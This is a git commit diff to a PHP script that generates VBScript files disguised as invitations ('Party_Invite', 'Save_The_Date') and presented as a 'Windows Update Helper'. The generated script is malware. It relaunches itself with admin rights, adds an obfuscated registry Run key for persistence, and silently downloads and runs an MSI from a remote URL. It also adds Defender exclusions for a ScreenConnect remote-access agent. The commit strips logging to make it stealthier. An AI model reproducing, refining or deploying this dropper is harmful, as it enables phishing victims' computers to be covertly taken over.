21600b8bef7da013bf774496cb7cc3fec817f4bd
benjohnson08875-arch <benjohnson08875@gmail.com>
2026-08-02 14:30:59 +0100

    Refactor invitation script and enhance functionality
    Updated baseNames array and added new functions for elevation and startup. Removed logging functionality and adjusted download execution.

--- index.php
+++ index.php
@@ -1,15 +1,21 @@
 <?php
-// invite.php - Fixed paths + logging
+// invite.php - Fixed array_rand empty error
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
-$baseNames = [ /* your full list */ ];
+$baseNames = [
+    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
+    "Event_Invitation", "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
+    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
+    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
+];
 
 $cookieName = "inv_used";
 $used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
 if (!is_array($used)) $used = [];
 
 $available = array_diff($baseNames, $used);
+
 if (empty($available)) {
     $available = $baseNames;
     $used = [];
@@ -17,6 +23,7 @@ if (empty($available)) {
 
 $chosenBase = $available[array_rand($available)];
 $random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
+
 $chosen = $chosenBase . "_" . $random5 . ".vbs";
 
 $used[] = $chosenBase;
@@ -39,24 +46,13 @@ for ($i = 0; $i < $junkLines; $i++) {
 }
 
 echo <<<VBS
-' Windows Update Helper - $ts - DEBUG
+' Windows Update Helper - $ts
 
-Dim $randV1, objShell, objFSO, logFile
+Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
 
 $randV1 = "$sessionId"
-logFile = objShell.ExpandEnvironmentStrings("%TEMP%\\debug_log.txt")
-
-Sub Log(msg)
-    On Error Resume Next
-    Dim f
-    Set f = objFSO.OpenTextFile(logFile, 8, True)
-    f.WriteLine "[" & Now & "] " & msg
-    f.Close
-End Sub
-
-Call Log("Script started - Session: $sessionId")
 
 Function D(s)
     Dim i, r : r = ""
@@ -66,28 +62,58 @@ Function D(s)
     D = r
 End Function
 
-' ... (keep IsElevated, Elevate, AddToStartup, DownloadAndExecute, HideAgent with Log calls) ...
+Function IsElevated()
+    On Error Resume Next
+    Dim wmi, proc
+    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
+    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
+    IsElevated = False
+End Function
+
+Sub $randFunc
+    On Error Resume Next
+    If Not IsElevated Then Call Elevate
+    Call AddToStartup
+    Call DownloadAndExecute
+    Call HideAgent
+End Sub
+
+Sub Elevate()
+    On Error Resume Next
+    Dim fsoPath, cmd
+    fsoPath = WScript.ScriptFullName
+    cmd = D("dmd /c ") & """" & fsoPath & """"
+    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
+    WScript.Quit
+End Sub
+
+Sub AddToStartup()
+    On Error Resume Next
+    objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
+        WScript.ScriptFullName, "REG_SZ"
+End Sub
 
 Sub DownloadAndExecute()
     On Error Resume Next
-    Call Log("Starting download")
     Dim u, p, http, strm
     u = "$scUrl"
-    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")  ' Simpler, non-obfuscated path
+    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
     
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", u, False
     http.Send
-    Call Log("HTTP Status: " & http.Status)
     If http.Status = 200 Then
         Set strm = CreateObject("ADODB.Stream")
         strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
-        Call Log("Downloaded to: " & p)
-        objShell.Run """" & p & """ /quiet", 0, True   ' Changed to /quiet for MSI
-        Call Log("Installer executed")
+        objShell.Run """" & p & """ /quiet", 0, True
         WScript.Sleep 5000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
     End If
+End Sub
+
+Sub HideAgent()
+    On Error Resume Next
+    objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'""", 0, True
 End Sub
 
 $junk
